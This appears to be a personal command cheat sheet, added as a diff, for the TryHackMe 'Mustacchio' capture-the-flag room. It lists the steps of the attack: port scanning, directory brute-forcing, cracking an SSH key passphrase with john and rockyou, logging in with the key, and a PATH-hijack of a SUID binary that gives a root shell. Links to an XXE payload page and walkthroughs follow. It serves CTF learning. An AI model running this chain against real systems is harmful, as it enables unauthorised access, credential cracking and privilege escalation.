@@ -1,0 +1,32 @@
+nmap -p 21,22,23,25,53,80,110,137,138,139,143,443,445,548,587,993,995,1433,1701,1723,3306,5432,8008,8443 -sV  10.10.93.100
+
+fffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.93.100/FUZZ -e php
+dirsearch -u 10.10.93.100
+gobuster dir -u 10.10.93.100 -w directory-list-2.3-medium.txt
+
+john --wordlist=rockyou.txt hash.txt
+
+ssh2john key > hash
+john --wordlist=/usr/share/wordlists/rockyou.txt hash
+
+ssh barry@10.10.93.100 -i key
+
+find / -perm -u=s -type f 2>/dev/null
+ls -la /home/joe/
+strings /home/joe/live_log
+
+cd /tmp
+echo "/bin/bash" > tail
+chmod 777 tail
+export PATH=/tmp:$PATH
+/home/joe/live_log
+cd /root
+cat root.txt
+
+https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#detect-the-vulnerability
+
+https://medium.com/@wiktorderda/mustacchio-tryhackme-ctf-walkthrough-71264db76a5d
+https://www.hackingarticles.in/mustacchio-tryhackme-walkthrough/
+https://syedabeerahmed.medium.com/tryhackme-mustacchio-d25c74c033bd
+https://medium.com/@oleg-zh/mustacchio-tryhackme-123ceecb5b4c
+
